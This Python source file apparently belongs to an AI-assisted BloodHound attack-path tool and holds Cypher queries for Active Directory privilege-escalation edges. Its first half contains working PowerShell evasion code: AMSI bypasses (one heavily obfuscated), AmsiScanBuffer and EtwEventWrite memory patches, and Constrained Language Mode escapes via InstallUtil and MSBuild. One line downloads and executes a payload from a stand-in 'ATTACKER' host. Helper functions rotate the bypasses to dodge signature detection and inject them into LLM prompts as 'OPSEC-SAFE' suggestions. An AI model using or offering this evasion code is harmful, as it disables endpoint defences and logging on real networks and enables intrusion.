"""
Edge Type Query Templates for BloodHound Attack Paths
Location: backend/routers/attack_paths/constants/edge_templates.py

Simplified version - the model knows AD security, we just provide:
- Cypher queries for each edge type
- Basic metadata (name, attack_type, priority, edges_used)

The model's inherent knowledge covers:
- Attack techniques and exploitation methods
- MITRE ATT&CK mappings
- Tools (Mimikatz, Rubeus, PowerView, Certipy, etc.)
- Remediation and detection guidance
"""

# ===========================================
# AMSI BYPASS TECHNIQUES - Diversified (Fix 3)
# Multiple families to avoid signature-based detection
# ===========================================
AMSI_BYPASS_TECHNIQUES = {
    # Family 1: Reflection-based (sets amsiInitFailed via reflection)
    "reflection_bypass": {
        "name": "Reflection-based AMSI Bypass",
        "family": "reflection",
        "description": "Uses .NET reflection to set amsiInitFailed flag",
        "code": """$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)""",
    },
    # Family 1b: Reflection with string obfuscation (harder to signature)
    "string_obfuscation_bypass": {
        "name": "String Obfuscation AMSI Bypass",
        "family": "reflection",
        "description": "Reflection bypass with heavy string obfuscation",
        "code": """S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )""",
    },
    # Family 2: Memory patching (patches AmsiScanBuffer to return clean)
    "memory_patch_bypass": {
        "name": "AmsiScanBuffer Memory Patch",
        "family": "patching",
        "description": "Patches amsi.dll AmsiScanBuffer in memory to always return AMSI_RESULT_CLEAN",
        "code": """$Win32 = @"
using System;using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)""",
    },
    # Family 2b: Compact memory patch variant
    "memory_patch_compact": {
        "name": "Compact AmsiScanBuffer Patch",
        "family": "patching",
        "description": "Minimal memory patch for AmsiScanBuffer",
        "code": """$a=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null,$null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null,[IntPtr]$a)""",
    },
    # Family 3: PowerShell Runspace manipulation
    "runspace_bypass": {
        "name": "PowerShell Runspace AMSI Bypass",
        "family": "runspace",
        "description": "Creates new runspace without AMSI initialization",
        "code": """$rs = [runspacefactory]::CreateRunspace()
$rs.ApartmentState = "STA"
$rs.ThreadOptions = "ReuseThread"
$rs.Open()
$p = $rs.CreatePipeline()
$p.Commands.AddScript('[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)')
$p.Invoke()""",
    },
    # Family 4: Force PowerShell v2 (no AMSI in PS v2)
    "powershell_v2_bypass": {
        "name": "PowerShell v2 Downgrade",
        "family": "downgrade",
        "description": "Uses PowerShell v2 which has no AMSI support (requires .NET 2.0)",
        "code": """powershell -version 2 -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')" """,
        "note": "Requires .NET Framework 2.0 installed on target",
    },
}

# ===========================================
# ETW BYPASS TECHNIQUES - Event Tracing for Windows
# Prevents telemetry from being sent to EDR
# ===========================================
ETW_BYPASS_TECHNIQUES = {
    # ETW bypass via patching EtwEventWrite
    "etw_patch_bypass": {
        "name": "EtwEventWrite Patch",
        "family": "etw_patching",
        "description": "Patches ntdll!EtwEventWrite to disable ETW logging",
        "code": """$ntdll = @"
using System;using System.Runtime.InteropServices;
public class ntdll {
    [DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ntdll
$ntdllHandle = [ntdll]::LoadLibrary("ntdll.dll")
$etwAddr = [ntdll]::GetProcAddress($ntdllHandle, "EtwEventWrite")
$p = 0
[ntdll]::VirtualProtect($etwAddr, [uint32]1, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)""",
    },
    # ETW Provider unregistration
    "etw_provider_unregister": {
        "name": "ETW Provider Unregistration",
        "family": "etw_unregister",
        "description": "Unregisters the PowerShell ETW provider",
        "code": """$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0)""",
    },
}

# ===========================================
# CLM BYPASS TECHNIQUES - Constrained Language Mode
# Escapes PowerShell language restrictions
# ===========================================
CLM_BYPASS_TECHNIQUES = {
    # CLM bypass via custom runspace
    "clm_runspace_bypass": {
        "name": "Runspace CLM Bypass",
        "family": "runspace",
        "description": "Creates runspace in FullLanguage mode",
        "code": """$ExecutionContext.SessionState.LanguageMode = "FullLanguage" """,
        "note": "May not work if enforced via AppLocker/WDAC",
    },
    # CLM bypass via PSByPassCLM
    "clm_installutil_bypass": {
        "name": "InstallUtil CLM Bypass",
        "family": "lolbin",
        "description": "Uses InstallUtil to execute code outside CLM",
        "code": """C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Temp\\bypass.exe""",
        "note": "Requires ability to drop bypass.exe to disk",
    },
    # CLM bypass via MSBuild
    "clm_msbuild_bypass": {
        "name": "MSBuild CLM Bypass",
        "family": "lolbin",
        "description": "Uses MSBuild to execute inline C# outside CLM restrictions",
        "code": """C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Temp\\bypass.csproj""",
        "note": "Requires ability to drop .csproj file",
    },
}

# Combined evasion techniques lookup
EVASION_TECHNIQUES = {
    **AMSI_BYPASS_TECHNIQUES,
    **ETW_BYPASS_TECHNIQUES,
    **CLM_BYPASS_TECHNIQUES,
}


# ===========================================
# EVASION TECHNIQUE SELECTION HELPERS
# Rotate through techniques to avoid repetition
# ===========================================
import random
from typing import Optional, Dict, List

# Track which techniques have been used (per session/report)
_used_amsi_techniques: List[str] = []
_used_etw_techniques: List[str] = []


def get_amsi_bypass(prefer_family: Optional[str] = None, exclude_used: bool = True) -> Dict:
    """
    Get an AMSI bypass technique, rotating through families to avoid repetition.

    Args:
        prefer_family: Preferred family (reflection, patching, runspace, downgrade)
        exclude_used: If True, avoid returning previously used techniques

    Returns:
        Dict with name, family, description, code keys
    """
    global _used_amsi_techniques

    available = list(AMSI_BYPASS_TECHNIQUES.keys())

    # Filter out used techniques if requested
    if exclude_used and _used_amsi_techniques:
        available = [k for k in available if k not in _used_amsi_techniques]
        # If all used, reset the list
        if not available:
            _used_amsi_techniques = []
            available = list(AMSI_BYPASS_TECHNIQUES.keys())

    # Prefer specific family if requested
    if prefer_family:
        family_matches = [
            k for k in available
            if AMSI_BYPASS_TECHNIQUES[k].get('family') == prefer_family
        ]
        if family_matches:
            available = family_matches

    # Select technique
    technique_key = random.choice(available) if available else list(AMSI_BYPASS_TECHNIQUES.keys())[0]
    _used_amsi_techniques.append(technique_key)

    return {
        'key': technique_key,
        **AMSI_BYPASS_TECHNIQUES[technique_key]
    }


def get_etw_bypass(exclude_used: bool = True) -> Dict:
    """
    Get an ETW bypass technique, rotating through options.

    Args:
        exclude_used: If True, avoid returning previously used techniques

    Returns:
        Dict with name, family, description, code keys
    """
    global _used_etw_techniques

    available = list(ETW_BYPASS_TECHNIQUES.keys())

    if exclude_used and _used_etw_techniques:
        available = [k for k in available if k not in _used_etw_techniques]
        if not available:
            _used_etw_techniques = []
            available = list(ETW_BYPASS_TECHNIQUES.keys())

    technique_key = random.choice(available) if available else list(ETW_BYPASS_TECHNIQUES.keys())[0]
    _used_etw_techniques.append(technique_key)

    return {
        'key': technique_key,
        **ETW_BYPASS_TECHNIQUES[technique_key]
    }


def get_evasion_context_for_prompt() -> str:
    """
    Generate evasion technique context for LLM prompts.
    Provides diverse bypass options the LLM can reference.

    Returns:
        String with evasion technique options formatted for prompt injection
    """
    # Get one technique from each family
    amsi_reflection = get_amsi_bypass(prefer_family='reflection', exclude_used=False)
    amsi_patching = get_amsi_bypass(prefer_family='patching', exclude_used=False)
    etw_bypass = get_etw_bypass(exclude_used=False)

    return f"""## AVAILABLE EVASION TECHNIQUES
When suggesting OPSEC-SAFE options that use PowerShell, consider these bypasses:

**AMSI Bypass Option 1 - {amsi_reflection['name']}:**
```powershell
{amsi_reflection['code'][:200]}...
```

**AMSI Bypass Option 2 - {amsi_patching['name']}:**
```powershell
{amsi_patching['code'][:200]}...
```

**ETW Bypass - {etw_bypass['name']}:**
```powershell
{etw_bypass['code'][:200]}...
```

Select different bypass techniques for different steps to avoid signature detection.
"""


def reset_evasion_tracking():
    """Reset the used technique tracking (call at start of new report)."""
    global _used_amsi_techniques, _used_etw_techniques
    _used_amsi_techniques = []
    _used_etw_techniques = []


# ===========================================
# DETECTION SIGNATURES (Keep - useful reference)
# ===========================================
DETECTION_SIGNATURES = {
    "kerberoasting": {"event_ids": [4769], "sigma_rule": "win_security_kerberoasting"},
    "dcsync": {"event_ids": [4662], "sigma_rule": "win_security_dcsync"},
    "asreproast": {"event_ids": [4768], "sigma_rule": "win_security_asreproast"},
    "credential_dumping": {"event_ids": [4656, 4663, 10], "sigma_rule": "win_security_lsass_access"},
    "pass_the_hash": {"event_ids": [4624], "sigma_rule": "win_security_pass_the_hash"},
}

# ===========================================
# EDGE TYPE QUERY TEMPLATES
# Simplified: Just queries and metadata. Model knows exploitation techniques.
# ===========================================
EDGE_TYPE_QUERY_TEMPLATES = {
    # ACL Abuse Edges
    "GenericAll": {
        "name": "GenericAll Privilege Abuse",
        "cypher": """MATCH p=(source)-[r:GenericAll]->(target)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["GenericAll"],
    },
    "GenericWrite": {
        "name": "GenericWrite Attribute Manipulation",
        "cypher": """MATCH p=(source)-[r:GenericWrite]->(target)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["GenericWrite"],
    },
    "WriteDacl": {
        "name": "WriteDacl Permission Escalation",
        "cypher": """MATCH p=(source)-[r:WriteDacl]->(target)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["WriteDacl"],
    },
    "WriteOwner": {
        "name": "WriteOwner Takeover Paths",
        "cypher": """MATCH p=(source)-[r:WriteOwner]->(target)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["WriteOwner"],
    },
    "Owns": {
        "name": "Object Ownership Abuse",
        "cypher": """MATCH p=(source)-[r:Owns]->(target)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "High",
        "edges_used": ["Owns"],
    },
    "ForceChangePassword": {
        "name": "Password Reset Attack Paths",
        "cypher": """MATCH p=(source)-[r:ForceChangePassword]->(target:User)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["ForceChangePassword"],
    },
    "AddMember": {
        "name": "Group Membership Manipulation",
        "cypher": """MATCH p=(source)-[r:AddMember]->(target:Group)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["AddMember"],
    },

    # Lateral Movement Edges
    "AdminTo": {
        "name": "Local Admin Lateral Movement",
        "cypher": """MATCH p=(source)-[r:AdminTo]->(target:Computer)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "lateral_movement",
        "priority": "High",
        "edges_used": ["AdminTo"],
    },
    "CanRDP": {
        "name": "RDP Access Paths",
        "cypher": """MATCH p=(source)-[r:CanRDP]->(target:Computer)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "lateral_movement",
        "priority": "Medium",
        "edges_used": ["CanRDP"],
    },
    "CanPSRemote": {
        "name": "PowerShell Remoting Paths",
        "cypher": """MATCH p=(source)-[r:CanPSRemote]->(target:Computer)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "lateral_movement",
        "priority": "High",
        "edges_used": ["CanPSRemote"],
    },
    "ExecuteDCOM": {
        "name": "DCOM Lateral Movement",
        "cypher": """MATCH p=(source)-[r:ExecuteDCOM]->(target:Computer)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "lateral_movement",
        "priority": "High",
        "edges_used": ["ExecuteDCOM"],
    },
    "HasSession": {
        "name": "Session Hijacking Opportunities",
        "cypher": """MATCH p=(user:User)-[r:HasSession]->(computer:Computer)
WHERE user.name IS NOT NULL AND computer.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["HasSession"],
    },

    # Credential Access Edges
    "ReadLAPSPassword": {
        "name": "LAPS Password Exposure",
        "cypher": """MATCH p=(source)-[r:ReadLAPSPassword]->(target:Computer)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["ReadLAPSPassword"],
    },
    "ReadGMSAPassword": {
        "name": "GMSA Password Access",
        "cypher": """MATCH p=(source)-[r:ReadGMSAPassword]->(target:User)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["ReadGMSAPassword"],
    },
    "DCSync": {
        "name": "DCSync Attack Capability",
        "cypher": """MATCH p=(source)-[r:DCSync|GetChanges|GetChangesAll]->(target:Domain)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["DCSync", "GetChanges", "GetChangesAll"],
    },
    "GetChanges": {
        "name": "DCSync Rights (GetChanges)",
        "cypher": """MATCH p=(source)-[r:GetChanges]->(target:Domain)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["GetChanges"],
    },
    "GetChangesAll": {
        "name": "DCSync Rights (GetChangesAll)",
        "cypher": """MATCH p=(source)-[r:GetChangesAll]->(target:Domain)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["GetChangesAll"],
    },

    # Kerberos Delegation Edges
    "AllowedToDelegate": {
        "name": "Constrained Delegation Abuse",
        "cypher": """MATCH p=(source)-[r:AllowedToDelegate]->(target:Computer)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["AllowedToDelegate"],
    },
    "AllowedToAct": {
        "name": "Resource-Based Constrained Delegation",
        "cypher": """MATCH p=(source)-[r:AllowedToAct]->(target:Computer)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["AllowedToAct"],
    },

    # Group Membership
    "MemberOf": {
        "name": "Privileged Group Membership",
        "cypher": """MATCH p=(source)-[r:MemberOf*1..2]->(target:Group)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
  AND (target.highvalue = true OR target.admincount = true OR target.name CONTAINS 'ADMIN')
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "High",
        "edges_used": ["MemberOf"],
    },

    # ADCS Edges
    "ADCSESC1": {
        "name": "ADCS ESC1 - Misconfigured Certificate Template",
        "cypher": """MATCH p=(source)-[r:ADCSESC1]->(target)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["ADCSESC1"],
    },
    "ADCSESC4": {
        "name": "ADCS ESC4 - Template Modification",
        "cypher": """MATCH p=(source)-[r:ADCSESC4]->(target)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["ADCSESC4"],
    },
    "ADCSESC6": {
        "name": "ADCS ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Enabled",
        "cypher": """MATCH p=(source)-[r:ADCSESC6]->(ca)
WHERE source.enabled = true OR NOT exists(source.enabled)
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["ADCSESC6"],
    },
    "ADCSESC9": {
        "name": "ADCS ESC9 - No Security Extension",
        "cypher": """MATCH p=(source)-[r:ADCSESC9]->(template)
WHERE source.enabled = true OR NOT exists(source.enabled)
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["ADCSESC9"],
    },
    "ADCSESC10": {
        "name": "ADCS ESC10 - Weak Certificate Mapping",
        "cypher": """MATCH p=(source)-[r:ADCSESC10]->(target)
WHERE source.enabled = true OR NOT exists(source.enabled)
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["ADCSESC10"],
    },
    "ADCSESC13": {
        "name": "ADCS ESC13 - Issuance Policy Abuse",
        "cypher": """MATCH p=(source)-[r:ADCSESC13]->(target)
WHERE source.enabled = true OR NOT exists(source.enabled)
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["ADCSESC13"],
    },
    "ManageCA": {
        "name": "CA Management Rights (ESC7)",
        "cypher": """MATCH p=(principal)-[r:ManageCA]->(ca)
WHERE principal.enabled = true OR NOT exists(principal.enabled)
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["ManageCA"],
    },
    "ManageCertificates": {
        "name": "Certificate Management Rights (ESC7)",
        "cypher": """MATCH p=(principal)-[r:ManageCertificates]->(ca)
WHERE principal.enabled = true OR NOT exists(principal.enabled)
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["ManageCertificates"],
    },
    "Enroll": {
        "name": "ADCS Certificate Enrollment Rights",
        "cypher": """MATCH p=(source)-[r:Enroll]->(target)
WHERE source.name IS NOT NULL AND target.name IS NOT NULL
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "High",
        "edges_used": ["Enroll"],
    },

    # Shadow Credentials
    "AddKeyCredentialLink": {
        "name": "Shadow Credentials - Key Credential Write",
        "cypher": """MATCH p=(principal)-[r:AddKeyCredentialLink]->(target:Computer)
WHERE principal.enabled = true OR NOT exists(principal.enabled)
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["AddKeyCredentialLink"],
    },
    "WriteAccountRestrictions": {
        "name": "Shadow Credentials / RBCD - Write Account Restrictions",
        "cypher": """MATCH p=(principal)-[r:WriteAccountRestrictions]->(target:Computer)
WHERE principal.enabled = true OR NOT exists(principal.enabled)
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["WriteAccountRestrictions"],
    },

    # GPO-Based Attacks
    "GPOLocalAdminOnDC": {
        "name": "GPO Grants Local Admin on Domain Controllers",
        "cypher": """MATCH (principal)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO)
MATCH (g)-[:GPLink]->(ou:OU)
WHERE ou.name =~ '(?i).*domain controller.*'
RETURN principal.name AS attacker, type(r) AS access_type, g.name AS gpo_name, ou.name AS target_ou
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "GPLink"],
    },

    # Kerberos Property-Based Attacks
    "Kerberoastable": {
        "name": "Kerberoastable Service Accounts",
        "cypher": """MATCH p=(u:User)-[:MemberOf*1..2]->(g:Group)
WHERE u.hasspn = true AND u.enabled = true
  AND NOT u.objectid ENDS WITH '-502'
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["Kerberoastable", "HasSPNConfigured"],
    },
    "ASREPRoastable": {
        "name": "AS-REP Roastable Accounts",
        "cypher": """MATCH p=(u:User)-[:MemberOf*1..2]->(g:Group)
WHERE u.dontreqpreauth = true AND u.enabled = true
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["ASREPRoastable", "DontReqPreAuth"],
    },

    # Unconstrained Delegation
    "UnconstrainedDelegation": {
        "name": "Unconstrained Delegation Computers",
        "cypher": """MATCH p=(u:User)-[:AdminTo]->(c:Computer)
WHERE c.unconstraineddelegation = true AND u.enabled = true
RETURN p
LIMIT 30""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["AdminTo"],
    }
}
